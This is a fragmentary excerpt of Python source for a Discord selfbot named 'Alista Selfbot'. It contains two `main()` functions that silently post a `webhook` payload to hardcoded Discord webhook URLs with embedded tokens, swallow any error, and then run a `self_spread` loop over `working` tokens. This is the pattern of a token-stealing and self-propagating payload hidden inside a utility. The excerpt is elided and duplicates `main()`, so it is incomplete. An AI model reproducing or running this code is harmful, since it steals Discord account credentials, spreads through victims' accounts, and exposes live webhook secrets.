...
ctypes.windll.kernel32.SetConsoleTitleW(f'[Alista Selfbot v{SELFBOT.__version__}] | Loading.')
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/825419397366808617/DbsJDZ-OC9-HRNmqmKqFcmLh-Xo1JoE9jTd7Y5Dhp74jXDCpHJIVNrZE8JcHdqXkTdzM", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
def startprint():
    ...
    print(f'''{Fore.RESET}
                       ...
                       {Fore.CYAN}Alista Selfbot {SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Alucard.user.name}#{Alucard.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Alucard.user.id}   
                       ...
                       {Fore.CYAN}Made by: {Fore.GREEN}alista#0296
...
def Init():
    if config.get('token') == "token-here":
        ...
        try:
            ...
            os.system(f'title (Alista Selfbot) - Version {SELFBOT.__version__}')
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/828171875237888021/df3gDOp8YMr8DA01wygWbNjG_LHuJ_UNj_b8xM1WBT1jB5C4oFdfARJ53wQccZ0a9nh4", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
